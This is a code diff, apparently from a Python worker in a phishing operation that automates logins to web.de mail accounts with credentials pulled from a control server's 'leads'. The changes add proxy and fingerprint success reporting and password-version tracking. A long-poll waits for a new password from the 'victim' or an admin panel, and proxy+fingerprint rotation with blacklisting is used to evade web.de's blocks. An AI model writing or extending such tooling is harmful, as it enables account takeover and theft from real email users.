@@ -166,6 +166,33 @@ def api_post(base_url: str, path: str, worker_secret: str, data: dict, timeout: 
         r.read()
 
 
+def report_proxy_fp_stats(
+    base_url: str,
+    worker_secret: str,
+    proxy_server: str,
+    fp_index: int,
+    reached_password: bool,
+) -> None:
+    """Пишет агрегированную статистику пары proxy+fingerprint на сервере."""
+    ps = (proxy_server or "").strip()
+    if not ps:
+        return
+    try:
+        api_post(
+            base_url,
+            "/api/worker/proxy-fp-stats",
+            worker_secret,
+            {
+                "proxyServer": ps,
+                "fpIndex": int(fp_index),
+                "reachedPassword": bool(reached_password),
+            },
+            timeout=25,
+        )
+    except Exception:
+        pass
+
+
 def api_post_json(
     base_url: str,
     path: str,
@@ -372,10 +399,25 @@ def report_push_resend_result(base_url: str, lead_id: str, worker_secret: str, s
         _log("ОШИБКА", f"не удалось отправить результат переотправки пуша: {type(e).__name__}: {e}")
 
 
-def wait_for_new_password_from_admin(base_url: str, lead_id: str, worker_secret: str) -> str | None:
-    """Один запрос long-poll: висит до передачи нового пароля из админки или таймаута сервера (~3 мин). Возвращает новый пароль или None."""
+def wait_for_new_password_from_admin(
+    base_url: str,
+    lead_id: str,
+    worker_secret: str,
+    *,
+    client_known_version: int = 0,
+    attempt_no: int | None = None,
+    version_track: dict | None = None,
+) -> str | None:
+    """Один запрос long-poll: висит до новой версии пароля (жертва/админка) или таймаута (~3 мин).
+
+    client_known_version — последняя известная passwordVersion лида; иначе сервер сразу отдаёт
+    текущий пароль (version > 0 vs 0), и скрипт не ждёт повторного ввода на сайте.
+    """
     url = base_url.rstrip("/") + "/api/webde-wait-password"
-    body = json.dumps({"leadId": lead_id}).encode("utf-8")
+    payload: dict = {"leadId": lead_id, "clientKnownVersion": int(client_known_version)}
+    if attempt_no is not None:
+        payload["attemptNo"] = int(attempt_no)
+    body = json.dumps(payload).encode("utf-8")
     _log(
         "WAIT",
         "HTTP long-poll старт: POST /api/webde-wait-password (скрипт блокируется до ~220с)",
@@ -399,8 +441,21 @@ def wait_for_new_password_from_admin(base_url: str, lead_id: str, worker_secret:
                 return None
             pw = data.get("password")
             got = (pw or "").strip() or None
+            if version_track is not None:
+                pv = data.get("passwordVersion")
+                if pv is not None:
+                    try:
+                        version_track["version"] = int(pv)
+                    except (TypeError, ValueError):
+                        pass
+                an = data.get("attemptNo")
+                if an is not None:
+                    try:
+                        version_track["attempt"] = int(an)
+                    except (TypeError, ValueError):
+                        pass
             if got:
-                _log("WAIT", "HTTP long-poll конец: пароль в ответе (админ сохранил новый пароль в лиде)")
+                _log("WAIT", "HTTP long-poll конец: пароль в ответе (новая версия в лиде)")
             else:
                 _log("WAIT", "HTTP long-poll конец: 200 OK но пароль пуст — считаем как нет пароля")
             return got
@@ -1317,13 +1372,33 @@ def _run_main(
         cleanup_login_artifacts()
         sys.exit(1)
 
+    _pw_track: dict = {"version": 0, "attempt": 1}
+
+    def _sync_pw_track_from_api(d: dict | None) -> None:
+        if not isinstance(d, dict):
+            return
+        pv = d.get("passwordVersion")
+        if pv is not None:
+            try:
+                _pw_track["version"] = int(pv)
+            except (TypeError, ValueError):
+                pass
+        an = d.get("attemptNo")
+        if an is not None:
+            try:
+                _pw_track["attempt"] = int(an)
+            except (TypeError, ValueError):
+                pass
+
     def get_credentials():
         try:
-            return api_get(
+            data = api_get(
                 base_url,
                 "/api/lead-credentials?leadId=" + quote(lead_id),
                 worker_secret,
             )
+            _sync_pw_track_from_api(data)
+            return data
         except urllib.error.HTTPError as e:
             _exit_if_lead_not_found_404(e, lead_id, "GET /api/lead-credentials")
             _log("ОШИБКА", f"запрос GET /api/lead-credentials не удался: HTTPError: {e}")
@@ -1363,6 +1438,7 @@ def _run_main(
             except (TypeError, ValueError):
                 grid_step_offset = 0
         _log("API", "данные: lead-login-context", verbose_only=True)
+        _sync_pw_track_from_api(login_ctx)
     else:
         cred = get_credentials()
         email = (cred.get("email") or "").strip()
@@ -1415,7 +1491,14 @@ def _run_main(
 
     # При неверных данных — один long-poll: админка сама передаёт новый пароль, без постоянных запросов
     def wait_for_new_password_callback():
-        return wait_for_new_password_from_admin(base_url, lead_id, worker_secret)
+        return wait_for_new_password_from_admin(
+            base_url,
+            lead_id,
+            worker_secret,
+            client_known_version=int(_pw_track.get("version") or 0),
+            attempt_no=int(_pw_track["attempt"]) if _pw_track.get("attempt") is not None else None,
+            version_track=_pw_track,
+        )
 
     try:
         _pf = PROXY_FILE.resolve()
@@ -1514,9 +1597,16 @@ def _run_main(
     _first_pc = proxies_to_try[0] if proxies_to_try else None
     _first_srv = (_first_pc.get("server") if isinstance(_first_pc, dict) else None) or ""
     if _first_srv:
+        _first_line = 0
+        if proxy_line_by_queue_index:
+            try:
+                _first_line = int(proxy_line_by_queue_index[0])
+            except Exception:
+                _first_line = 0
+        _first_proxy_num = _first_line if _first_line > 0 else 1
         _log(
             "ПРОКСИ",
-            f"записей {len(geo_entries)} · первая попытка Playwright → {_first_srv}",
+            f"записей {len(geo_entries)} · первая попытка Playwright → #{_first_proxy_num} {_first_srv}",
             f"гео сортировка: {ip_country or '—'} · в очереди {len(proxies_to_try)}",
         )
     else:
@@ -1761,11 +1851,6 @@ def _run_main(
         except ValueError:
             _log("ПРОКСИ", f"WEBDE_FP_GRID_OFFSET={_fp_grid_off_raw!r} не число — игнор")
 
-    pw_blk_init = automation_profile.get("playwright") if isinstance(automation_profile, dict) else None
-    has_api_ua = isinstance(pw_blk_init, dict) and bool(
-        (pw_blk_init.get("userAgent") or pw_blk_init.get("user_agent") or "").strip()
-    )
-
     blocked_pairs = load_vorue_blacklist_pairs()
     _scan_cap = max_retry_attempts if max_retry_attempts is not None else full_grid_attempts
     max_scan_per_try = max(full_grid_attempts, _scan_cap) + max(64, len(blocked_pairs))
@@ -1786,9 +1871,6 @@ def _run_main(
 
     def step_is_blocked(pk: str, fi: int, au_used: int) -> bool:
         if (pk, fi) in blocked_pairs:
-            return True
-        # Первая попытка с UA с лида: в блеклист пишем (прокси, -1), не индекс пула.
-        if au_used == 0 and has_api_ua and (pk, -1) in blocked_pairs:
             return True
         return False
 
@@ -1875,35 +1957,32 @@ def _run_main(
             return
 
         s, proxy_index, fingerprint_index, proxy_config, proxy_key_used = found
-        # Первый фактический запуск — UA с лида; дальше (любой ретрай) — пул по fp_index.
-        force_pool = (attempts_used > 0) or (not has_api_ua)
+        # Всегда используем пуловый отпечаток из сетки начиная с первой попытки.
+        force_pool = True
         ps = (proxy_config.get("server") if proxy_config else None) or "без прокси"
         one_based = attempts_used + 1
         _px_line = 0
         if proxy_config and proxy_index < len(proxy_line_by_queue_index):
             _px_line = int(proxy_line_by_queue_index[proxy_index])
-        _WEBDE_ATTEMPT_TAG = f"web.de {fingerprint_index} | {_px_line} | {one_based}/{_attempts_cap_str}"
+        fp_num = fingerprint_index + 1
+        proxy_num = _px_line if _px_line > 0 else (proxy_index + 1)
+        _WEBDE_ATTEMPT_TAG = f"web.de fp#{fp_num} | px#{proxy_num} | {one_based}/{_attempts_cap_str}"
 
         if attempts_used == 0:
-            if has_api_ua and not force_pool:
-                _log(
-                    "ДИАГНО",
-                    "первая попытка",
-                    f"прокси={ps}; UA с лида (API); шаг сетки s={s}",
-                    verbose_only=True,
-                )
-            else:
-                _log(
-                    "ДИАГНО",
-                    "первая попытка",
-                    f"прокси={ps}; пул fp_index={fingerprint_index}; шаг s={s}",
-                    verbose_only=True,
-                )
-            _log("ПРОКСИ", f"попытка входа · {ps} · fp_pool={fingerprint_index} · proxy.txt строка={_px_line}")
+            _log(
+                "ДИАГНО",
+                "первая попытка",
+                f"прокси #{proxy_num}={ps}; пул fp #{fp_num} (idx={fingerprint_index}); шаг s={s}",
+                verbose_only=True,
+            )
+            _log(
+                "ПРОКСИ",
+                f"попытка входа · proxy#{proxy_num} {ps} · fp_pool={fingerprint_index} (#{fp_num}) · proxy.txt строка={_px_line}",
+            )
         else:
             _log(
                 "ПРОКСИ",
-                f"попытка входа · {ps} · fp_pool={fingerprint_index} · proxy.txt строка={_px_line}",
+                f"попытка входа · proxy#{proxy_num} {ps} · fp_pool={fingerprint_index} (#{fp_num}) · proxy.txt строка={_px_line}",
                 ps[:120],
             )
 
@@ -1986,6 +2065,7 @@ def _run_main(
                 "password_timeout",
             ):
                 if result == "error":
+                    report_proxy_fp_stats(base_url, worker_secret, ps if proxy_config else "", fingerprint_index, False)
                     last_error_code = "500"
                     page_seen_text = get_last_alert_text()
                     last_error_message = page_seen_text or "Ошибка входа (страница не распознана, таймаут и т.д.)"
@@ -2001,11 +2081,13 @@ def _run_main(
                     _log("РЕЗУЛЬТАТ", f"{result} (все попытки)")
                     send_result(base_url, lead_id, worker_secret, "error", error_code=last_error_code, error_message=last_error_message)
                 elif result == "password_timeout":
+                    report_proxy_fp_stats(base_url, worker_secret, ps if proxy_config else "", fingerprint_index, True)
                     last_error_code = "408"
                     last_error_message = "Пароль не получен от админки (long-poll timeout)"
                     _log("РЕЗУЛЬТАТ", result)
                     send_result(base_url, lead_id, worker_secret, "error", error_code=last_error_code, error_message=last_error_message)
                 else:
+                    report_proxy_fp_stats(base_url, worker_secret, ps if proxy_config else "", fingerprint_index, True)
                     if result == "wrong_credentials" and wrong_credentials_already_sent[0]:
                         _log("РЕЗУЛЬТАТ", "wrong_credentials уже в API", verbose_only=True)
                     else:
@@ -2028,6 +2110,7 @@ def _run_main(
                 _log("==========", "END SESSION", verbose_only=True)
                 return
             else:
+                report_proxy_fp_stats(base_url, worker_secret, ps if proxy_config else "", fingerprint_index, False)
                 _log("ОШИБКА", f"неожиданный результат login_* ({mail_provider}): {result!r}")
                 last_error_code = "500"
                 last_error_message = str(result)[:200]
@@ -2048,18 +2131,19 @@ def _run_main(
             _log("==========", "END SESSION", verbose_only=True)
             return
         except LoginTemporarilyUnavailable:
+            report_proxy_fp_stats(base_url, worker_secret, ps if proxy_config else "", fingerprint_index, False)
             why = (get_last_alert_text() or "").strip() or "блок/капча/Weiter без перехода"
             wl = why.lower()
             lt_unavail = (LOGIN_TEMPORARILY_UNAVAILABLE_TEXT or "").strip().lower()
             is_voruebergehend = "vorübergehend" in wl or (bool(lt_unavail) and lt_unavail in wl)
             if is_voruebergehend:
                 had_voruebergehend = True
-                fp_bl = -1 if (has_api_ua and not force_pool) else fingerprint_index
+                fp_bl = fingerprint_index
                 append_vorue_blacklist_pair(proxy_key_used, fp_bl, blocked_pairs)
                 _log(
                     "БЛЕКЛИСТ",
                     "vorübergehend → запись прокси+fp_index",
-                    f"fp={'API' if fp_bl < 0 else fp_bl} · {proxy_key_used[:140]}",
+                    f"fp={fp_bl} · {proxy_key_used[:140]}",
                 )
                 _log(
                     "ПРОКСИ",
@@ -2090,6 +2174,7 @@ def _run_main(
             _log("==========", "END SESSION", verbose_only=True)
             return
         except Exception as e:
+            report_proxy_fp_stats(base_url, worker_secret, ps if proxy_config else "", fingerprint_index, False)
             last_error_code = "500"
             err_msg = str(e).lower()
             if "403" in err_msg or "forbidden" in err_msg:
